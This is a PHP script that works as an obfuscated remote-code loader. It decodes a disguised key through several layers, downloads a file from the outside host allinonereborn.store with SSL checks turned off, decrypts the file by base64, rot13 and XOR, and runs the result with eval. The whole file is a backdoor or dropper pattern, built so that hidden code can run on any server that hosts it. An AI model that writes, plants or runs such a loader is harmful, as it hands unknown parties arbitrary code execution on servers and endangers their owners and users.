<?php
$garbage_key = "+_=aEp1V2Q0TysyT0xrQmdJVkdQVStEMXBzYmtPTVhwbz0==_+"; 
// -------------------------------------------------------

// Remote encoded file URL
$remote_url = "https://allinonereborn.store/remote/encoded_secure.txt";

function extractRealKey($garbage) {
    $clean = preg_replace('/^[@#$!%^&*()+_=-]+/', '', $garbage);
    $clean = preg_replace('/[@#$!%^&*()+_=-]+$/', '', $clean);
    
    $step2 = base64_decode($clean);
    $step2 = base64_decode($step2);
    
    $step3 = '';
    for ($i = 0; $i < strlen($step2); $i++) {
        $ascii = ord($step2[$i]);
        $new_ascii = $ascii - ($i * 13) - 27;
        $step3 .= chr($new_ascii);
    }
    
    $real_key = strrev($step3);
    
    return $real_key;
}

$real_key = extractRealKey($garbage_key);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $remote_url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$content = curl_exec($ch);
curl_close($ch);

if (empty($content)) {
    die("Error: Cannot fetch remote file");
}

if (!preg_match('/\$data = "([^"]+)"/', $content, $match)) {
    die("Error: Invalid file format");
}

$encrypted_data = $match[1];

$step1 = base64_decode($encrypted_data);

$step2 = str_rot13($step1);

$step3 = base64_decode($step2);

$decoded = '';
for ($i = 0; $i < strlen($step3); $i++) {
    $decoded .= $step3[$i] ^ $real_key[$i % strlen($real_key)];
}

eval('?>' . $decoded);

?>
